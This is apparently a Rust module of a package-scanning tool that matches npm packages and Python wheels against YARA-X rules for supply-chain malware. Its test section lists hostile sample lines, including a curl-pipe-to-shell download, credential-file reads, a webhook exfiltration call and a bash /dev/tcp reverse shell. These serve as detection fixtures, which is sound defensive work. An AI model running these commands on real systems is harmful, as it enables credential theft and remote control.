//! YARA-X matching of package files (FR-019, FR-028; SPEC-015).
//!
//! Bundled rules (`rules/bundled/*.yar`, embedded) plus the user's rule files
//! in `<config dir>/rules/` (trusted settings; a workspace can never add a
//! rule). A match is a `yara_match` finding with action `approve`. Matching is
//! bounded per file, per package and per plan; a file a bound skipped is an
//! `incomplete_scan` `approve`, never a clean result.

use super::{truncate, PackageId, MAX_EVIDENCE_CHARS};
use crate::paths::TrustedPaths;
use crate::protocol::{Finding, FindingAction, FindingKind};
use crate::settings::RuleSettings;
use crate::{Error, Result};
use std::collections::{BTreeMap, BTreeSet};
use std::io::Read;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

/// Bundled rule files: (name, source). Our own rules only (SPEC-015).
const BUNDLED: &[(&str, &str)] = &[(
    "f2c_supply_chain.yar",
    include_str!("../../../../rules/bundled/f2c_supply_chain.yar"),
)];
pub const BUNDLED_NAMESPACE: &str = "bundled";
pub const SOURCE: &str = "yara";

const MAX_USER_FILES: usize = 256;
const MAX_USER_FILE_BYTES: u64 = 1 << 20;
/// Larger files are skipped and reported.
pub const MAX_FILE: u64 = 32 << 20;
const MAX_PKG: u64 = 256 << 20;
const MAX_PLAN: u64 = 2 << 30;
const MAX_FILES: usize = 20_000;
const FILE_TIMEOUT: Duration = Duration::from_secs(10);
/// Wall time for all matching of one plan; later files are skipped.
const PLAN_TIME: Duration = Duration::from_secs(300);
const MAX_FINDINGS: usize = 16;

pub fn user_rules_dir(paths: &TrustedPaths) -> PathBuf {
    paths.config_dir.join("rules")
}

/// `*.yar` / `*.yara` directly in the user rules folder, sorted.
pub fn user_rule_files(paths: &TrustedPaths) -> Result<Vec<PathBuf>> {
    let dir = user_rules_dir(paths);
    let Ok(entries) = std::fs::read_dir(&dir) else {
        return Ok(Vec::new());
    };
    let mut out: Vec<PathBuf> = entries
        .flatten()
        .filter(|e| e.file_type().is_ok_and(|t| t.is_file()))
        .map(|e| e.path())
        .filter(|p| {
            p.extension()
                .and_then(|e| e.to_str())
                .is_some_and(|e| e.eq_ignore_ascii_case("yar") || e.eq_ignore_ascii_case("yara"))
        })
        .collect();
    out.sort();
    if out.len() > MAX_USER_FILES {
        return Err(Error::invalid(format!(
            "more than {MAX_USER_FILES} rule files in {}",
            dir.display()
        )));
    }
    Ok(out)
}

fn namespace_for(path: &Path) -> String {
    let stem = path.file_stem().and_then(|s| s.to_str()).unwrap_or("rules");
    let clean: String = stem
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
        .collect();
    format!("user.{clean}")
}

fn read_rule_file(path: &Path) -> Result<String> {
    let bytes = crate::fsutil::read_bounded(path, MAX_USER_FILE_BYTES).map_err(|e| {
        Error::invalid(format!(
            "rule file {} cannot be read: {}",
            path.display(),
            e.message
        ))
    })?;
    String::from_utf8(bytes)
        .map_err(|_| Error::invalid(format!("rule file {} is not UTF-8 text", path.display())))
}

fn compiler<'a>() -> yara_x::Compiler<'a> {
    let mut c = yara_x::Compiler::new();
    c.colorize_errors(false).enable_includes(false);
    c
}

/// The engine's report, reduced to "what at file:line:column".
fn short_error(e: &yara_x::errors::CompileError) -> String {
    let text = e.to_string();
    let mut lines = text.lines();
    let title = lines
        .next()
        .unwrap_or("rule error")
        .split_once("]: ")
        .map_or_else(|| text.lines().next().unwrap_or(""), |(_, t)| t)
        .trim()
        .to_string();
    let at = text
        .lines()
        .find_map(|l| l.trim().strip_prefix("--> "))
        .map(str::to_string);
    let msg = match at {
        Some(at) => format!("{title} at {at}"),
        None => title,
    };
    truncate(&msg, 600)
}

fn add(
    c: &mut yara_x::Compiler<'_>,
    namespace: &str,
    origin: &str,
    src: &str,
) -> std::result::Result<(), String> {
    c.new_namespace(namespace);
    c.add_source(yara_x::SourceCode::from(src).with_origin(origin))
        .map(|_| ())
        .map_err(|e| short_error(&e))
}

/// One compiled rule set.
pub struct Matcher {
    rules: yara_x::Rules,
}

/// One rule in a compiled set.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RuleInfo {
    pub namespace: String,
    pub identifier: String,
    pub description: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Hit {
    pub rule: RuleInfo,
    /// Offset of the first match.
    pub offset: usize,
}

/// `rules check`: one entry per rule file (bundled first), with its error.
#[derive(Clone, Debug)]
pub struct FileCheck {
    pub file: String,
    pub rules: usize,
    pub error: Option<String>,
}

impl Matcher {
    /// Bundled rules plus the user's files. `Ok(None)` when rules are off. A
    /// user file that does not compile is an `invalid_input` error naming
    /// the file and line.
    pub fn load(paths: &TrustedPaths, settings: &RuleSettings) -> Result<Option<Matcher>> {
        if !settings.enabled {
            return Ok(None);
        }
        let files = user_rule_files(paths)?;
        let mut sources = Vec::new();
        for f in &files {
            sources.push((f.clone(), read_rule_file(f)?));
        }
        let mut c = compiler();
        for (name, src) in BUNDLED {
            add(&mut c, BUNDLED_NAMESPACE, name, src)
                .map_err(|e| Error::internal(format!("bundled rule {name}: {e}")))?;
        }
        for (path, src) in &sources {
            let origin = path.display().to_string();
            add(&mut c, &namespace_for(path), &origin, src)
                .map_err(|e| Error::invalid(format!("rule file {origin} does not compile: {e}")))?;
        }
        Ok(Some(Matcher { rules: c.build() }))
    }

    /// Only the bundled rules (tests, `rules list` fallback).
    pub fn bundled() -> Matcher {
        let mut c = compiler();
        for (name, src) in BUNDLED {
            add(&mut c, BUNDLED_NAMESPACE, name, src).expect("bundled rules compile");
        }
        Matcher { rules: c.build() }
    }

    pub fn rules(&self) -> Vec<RuleInfo> {
        self.rules.iter().map(|r| info(&r)).collect()
    }

    fn scanner(&self) -> yara_x::Scanner<'_> {
        let mut s = yara_x::Scanner::new(&self.rules);
        s.set_timeout(FILE_TIMEOUT);
        s.max_matches_per_pattern(64);
        s
    }

    /// Matching rules for one buffer.
    pub fn scan_bytes(&self, data: &[u8]) -> std::result::Result<Vec<Hit>, String> {
        scan_with(&mut self.scanner(), data)
    }
}

fn info(r: &yara_x::Rule<'_, '_>) -> RuleInfo {
    let description = r
        .metadata()
        .find_map(|(k, v)| match (k, v) {
            ("description", yara_x::MetaValue::String(s)) => Some(s.to_string()),
            _ => None,
        })
        .unwrap_or_default();
    RuleInfo {
        namespace: r.namespace().to_string(),
        identifier: r.identifier().to_string(),
        description,
    }
}

fn scan_with(
    scanner: &mut yara_x::Scanner<'_>,
    data: &[u8],
) -> std::result::Result<Vec<Hit>, String> {
    let results = scanner.scan(data).map_err(|e| e.to_string())?;
    Ok(results
        .matching_rules()
        .map(|r| Hit {
            offset: r
                .patterns()
                .flat_map(|p| p.matches().map(|m| m.range().start).collect::<Vec<_>>())
                .min()
                .unwrap_or(0),
            rule: info(&r),
        })
        .collect())
}

/// Compile the bundled set and each user file on its own, for `rules check`.
pub fn check(paths: &TrustedPaths) -> Result<Vec<FileCheck>> {
    let mut out = Vec::new();
    for (name, src) in BUNDLED {
        out.push(check_one(
            BUNDLED_NAMESPACE,
            &format!("(bundled) {name}"),
            src,
        ));
    }
    for f in user_rule_files(paths)? {
        let label = f.display().to_string();
        match read_rule_file(&f) {
            Ok(src) => out.push(check_one(&namespace_for(&f), &label, &src)),
            Err(e) => out.push(FileCheck {
                file: label,
                rules: 0,
                error: Some(e.message),
            }),
        }
    }
    Ok(out)
}

fn check_one(namespace: &str, label: &str, src: &str) -> FileCheck {
    let mut c = compiler();
    match add(&mut c, namespace, label, src) {
        Ok(()) => FileCheck {
            file: label.to_string(),
            rules: c.build().iter().len(),
            error: None,
        },
        Err(e) => FileCheck {
            file: label.to_string(),
            rules: 0,
            error: Some(e),
        },
    }
}

// ------------------------------------------------------------------ bounds

/// Bytes and time left for one plan.
pub struct Budget {
    bytes: u64,
    deadline: Instant,
}

impl Default for Budget {
    fn default() -> Self {
        Budget {
            bytes: MAX_PLAN,
            deadline: Instant::now() + PLAN_TIME,
        }
    }
}

/// Where a matched file runs, for the evidence.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum When {
    Install,
    Load,
    Startup,
}

impl When {
    fn text(self) -> &'static str {
        match self {
            When::Install => "in an install script (it runs in the sandbox)",
            When::Load => {
                "in package code that runs when your project loads it, outside the sandbox"
            }
            When::Startup => {
                "in a startup file that runs whenever Python starts in this environment"
            }
        }
    }
}

/// (rule namespace, rule id, file) -> (when, line, description).
type Hits = BTreeMap<(String, String, String), (When, Option<usize>, String)>;

/// Collects hits and skips for one package, then turns them into findings.
pub(crate) struct PackageScan<'m> {
    scanner: yara_x::Scanner<'m>,
    target: String,
    source: &'static str,
    hits: Hits,
    skipped: Vec<(String, String)>,
    used: u64,
}

impl<'m> PackageScan<'m> {
    pub(crate) fn new(m: &'m Matcher, pkg: &PackageId, source: &'static str) -> Self {
        PackageScan {
            scanner: m.scanner(),
            target: pkg.display(),
            source,
            hits: BTreeMap::new(),
            skipped: Vec::new(),
            used: 0,
        }
    }

    /// Whether a file of `len` bytes may be read; records the skip if not.
    pub(crate) fn admit(&mut self, file: &str, len: u64, budget: &Budget) -> bool {
        let why = if len > MAX_FILE {
            Some(format!("larger than {} MiB", MAX_FILE >> 20))
        } else if self.used + len > MAX_PKG {
            Some(format!(
                "package read budget of {} MiB reached",
                MAX_PKG >> 20
            ))
        } else if len > budget.bytes {
            Some(format!(
                "plan read budget of {} MiB reached",
                MAX_PLAN >> 20
            ))
        } else if Instant::now() > budget.deadline {
            Some(format!(
                "plan time budget of {} s reached",
                PLAN_TIME.as_secs()
            ))
        } else {
            None
        };
        match why {
            Some(w) => {
                self.skip(file, &w);
                false
            }
            None => true,
        }
    }

    pub(crate) fn skip(&mut self, file: &str, why: &str) {
        self.skipped.push((file.to_string(), why.to_string()));
    }

    pub(crate) fn scan(&mut self, file: &str, data: &[u8], when: When, budget: &mut Budget) {
        self.used += data.len() as u64;
        budget.bytes = budget.bytes.saturating_sub(data.len() as u64);
        match scan_with(&mut self.scanner, data) {
            Ok(hits) => {
                for h in hits {
                    let line = text_line(data, h.offset);
                    self.hits
                        .entry((h.rule.namespace, h.rule.identifier, file.to_string()))
                        .or_insert((when, line, h.rule.description));
                }
            }
            Err(e) => self.skip(file, &format!("matching failed: {e}")),
        }
    }

    pub(crate) fn findings(self) -> Vec<Finding> {
        let total = self.hits.len();
        let mut out: Vec<Finding> = self
            .hits
            .into_iter()
            .take(MAX_FINDINGS)
            .map(|((ns, id, file), (when, line, desc))| {
                let desc = if desc.is_empty() {
                    String::new()
                } else {
                    format!(" ({desc})")
                };
                Finding::new(
                    FindingKind::YaraMatch,
                    FindingAction::Approve,
                    self.source,
                    truncate(
                        &crate::redact::redact_url_credentials(&format!(
                            "rule {ns}:{id}{desc} matched {file} {}",
                            when.text()
                        )),
                        MAX_EVIDENCE_CHARS,
                    ),
                )
                .target(self.target.clone())
                .location(match line {
                    Some(l) => format!("{file}:{l}"),
                    None => file,
                })
            })
            .collect();
        if total > MAX_FINDINGS {
            out.push(
                Finding::new(
                    FindingKind::YaraMatch,
                    FindingAction::Approve,
                    self.source,
                    format!(
                        "{} more YARA matches in this package are not listed",
                        total - MAX_FINDINGS
                    ),
                )
                .target(self.target.clone()),
            );
        }
        if let Some((file, why)) = self.skipped.first() {
            out.push(
                Finding::new(
                    FindingKind::IncompleteScan,
                    FindingAction::Approve,
                    self.source,
                    truncate(
                        &format!(
                            "{} file(s) were not matched against the YARA rules; first: {file} ({why})",
                            self.skipped.len()
                        ),
                        MAX_EVIDENCE_CHARS,
                    ),
                )
                .target(self.target.clone())
                .location(file.clone()),
            );
        }
        out
    }
}

/// 1-based line of `offset` when the prefix looks like text.
fn text_line(data: &[u8], offset: usize) -> Option<usize> {
    let head = &data[..offset.min(data.len())];
    if data[..data.len().min(8192)].contains(&0) {
        return None;
    }
    Some(head.iter().filter(|&&b| b == b'\n').count() + 1)
}

/// Package-relative files under `root`, nested `node_modules` and `.git`
/// excluded; the bool is true when the walk stopped at `MAX_FILES`.
pub(crate) fn walk(root: &Path) -> (Vec<String>, bool) {
    fn go(dir: &Path, rel: &str, out: &mut Vec<String>, full: &mut bool) {
        let Ok(entries) = std::fs::read_dir(dir) else {
            return;
        };
        let mut entries: Vec<_> = entries.flatten().collect();
        entries.sort_by_key(|e| e.file_name());
        for e in entries {
            if out.len() >= MAX_FILES {
                *full = true;
                return;
            }
            let name = e.file_name().to_string_lossy().into_owned();
            let Ok(ft) = e.file_type() else { continue };
            let path = if rel.is_empty() {
                name.clone()
            } else {
                format!("{rel}/{name}")
            };
            if ft.is_dir() {
                if name != "node_modules" && name != ".git" {
                    go(&e.path(), &path, out, full);
                }
            } else if ft.is_file() {
                out.push(path);
            }
        }
    }
    let mut out = Vec::new();
    let mut full = false;
    go(root, "", &mut out, &mut full);
    (out, full)
}

/// Match every file of one installed npm package. `install_files` are the
/// package-relative files its lifecycle scripts run (install time).
pub fn scan_package(
    m: &Matcher,
    pkg: &PackageId,
    dir: &Path,
    install_files: &BTreeSet<String>,
    budget: &mut Budget,
) -> Vec<Finding> {
    let mut s = PackageScan::new(m, pkg, SOURCE);
    let (files, full) = walk(dir);
    if full {
        s.skip("(more files)", &format!("over {MAX_FILES} files"));
    }
    for rel in files {
        let full_path = dir.join(&rel);
        let Ok(meta) = std::fs::metadata(&full_path) else {
            s.skip(&rel, "cannot be read");
            continue;
        };
        if !s.admit(&rel, meta.len(), budget) {
            continue;
        }
        let Ok(bytes) = std::fs::read(&full_path) else {
            s.skip(&rel, "cannot be read");
            continue;
        };
        let when = if install_files.contains(&rel) || rel == "package.json" {
            When::Install
        } else {
            When::Load
        };
        s.scan(&rel, &bytes, when, budget);
    }
    s.findings()
}

/// Whether a wheel entry runs at interpreter startup.
pub fn is_startup_entry(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    (!lower.contains('/') && lower.ends_with(".pth"))
        || lower
            .rsplit('/')
            .next()
            .is_some_and(|f| f == "sitecustomize.py" || f == "usercustomize.py")
}

/// Match every entry of one wheel (read in memory, never extracted).
pub fn scan_wheel(m: &Matcher, pkg: &PackageId, wheel: &Path, budget: &mut Budget) -> Vec<Finding> {
    let mut s = PackageScan::new(m, pkg, SOURCE);
    let name = wheel
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    let archive = std::fs::File::open(wheel)
        .map_err(|e| e.to_string())
        .and_then(|f| zip::ZipArchive::new(f).map_err(|e| e.to_string()));
    let mut archive = match archive {
        Ok(a) => a,
        Err(e) => {
            s.skip(&name, &format!("not a readable wheel: {e}"));
            return s.findings();
        }
    };
    for i in 0..archive.len().min(MAX_FILES) {
        let Ok(mut entry) = archive.by_index(i) else {
            s.skip(&format!("{name}#{i}"), "unreadable entry");
            continue;
        };
        if entry.is_dir() {
            continue;
        }
        let entry_name = String::from_utf8_lossy(entry.name_raw()).replace('\\', "/");
        if !s.admit(&entry_name, entry.size(), budget) {
            continue;
        }
        let mut bytes = Vec::new();
        if (&mut entry)
            .take(MAX_FILE + 1)
            .read_to_end(&mut bytes)
            .is_err()
            || bytes.len() as u64 > MAX_FILE
        {
            s.skip(&entry_name, "unreadable or larger than declared");
            continue;
        }
        let when = if is_startup_entry(&entry_name) {
            When::Startup
        } else {
            When::Load
        };
        s.scan(&entry_name, &bytes, when, budget);
    }
    if archive.len() > MAX_FILES {
        s.skip("(more entries)", &format!("over {MAX_FILES} entries"));
    }
    s.findings()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// One sample per bundled rule; each must match exactly its own rule.
    const SAMPLES: &[(&str, &str)] = &[
        (
            "hidden_code_eval_decode",
            "eval(Buffer.from(x, 'base64').toString())",
        ),
        (
            "hidden_code_python_exec_decode",
            "exec(base64.b64decode('cHJpbnQoMSk='))",
        ),
        (
            "credential_store_harvest",
            "read(home + '/.npmrc'); read(home + '/.git-credentials'); read('.aws/credentials')",
        ),
        ("environment_harvest", "post(JSON.stringify(process.env));"),
        (
            "download_and_run",
            "curl -fsSL https://example.test/x.sh | sh",
        ),
        (
            "exfiltration_endpoint",
            "fetch('https://discord.com/api/webhooks/123456789/abc')",
        ),
        ("startup_persistence", "schtasks /create /tn x /tr y"),
        (
            "ci_workflow_write",
            "fs.writeFileSync('.github/workflows/x.yml', body)",
        ),
        ("crypto_miner", "pool: stratum+tcp://pool.example.test:3333"),
        ("reverse_shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    ];

    #[test]
    fn each_bundled_rule_matches_its_sample() {
        let m = Matcher::bundled();
        let ids: Vec<String> = m.rules().into_iter().map(|r| r.identifier).collect();
        for (rule, sample) in SAMPLES {
            assert!(ids.iter().any(|i| i == rule), "{rule} is bundled");
            let hits = m.scan_bytes(sample.as_bytes()).unwrap();
            let got: Vec<&str> = hits.iter().map(|h| h.rule.identifier.as_str()).collect();
            assert_eq!(got, vec![*rule], "sample for {rule}");
        }
        let obf: String = (0..60).map(|i| format!("var _0x{i:04x}=1;")).collect();
        let hits = m.scan_bytes(obf.as_bytes()).unwrap();
        assert_eq!(hits[0].rule.identifier, "javascript_obfuscator_output");
        assert!(m.rules().iter().all(|r| !r.description.is_empty()));
    }

    #[test]
    fn clean_code_matches_nothing() {
        let m = Matcher::bundled();
        let clean = b"module.exports = function leftPad(s, n) { return String(s).padStart(n); };\n";
        assert!(m.scan_bytes(clean).unwrap().is_empty());
    }

    #[test]
    fn errors_name_file_and_line() {
        let f = check_one(
            "user.t",
            "/cfg/rules/bad.yar",
            "rule x {\n condition:\n  nope(\n}",
        );
        let e = f.error.expect("does not compile");
        assert!(e.contains("/cfg/rules/bad.yar:"), "{e}");
    }

    #[test]
    fn startup_entries() {
        assert!(is_startup_entry("evil.pth"));
        assert!(is_startup_entry("pkg/sitecustomize.py"));
        assert!(!is_startup_entry("pkg/data.pth"));
        assert!(!is_startup_entry("pkg/__init__.py"));
    }

    #[test]
    fn hits_carry_lines_for_text_only() {
        assert_eq!(text_line(b"a\nb\nc", 4), Some(3));
        assert_eq!(text_line(b"a\0b", 2), None);
    }
}
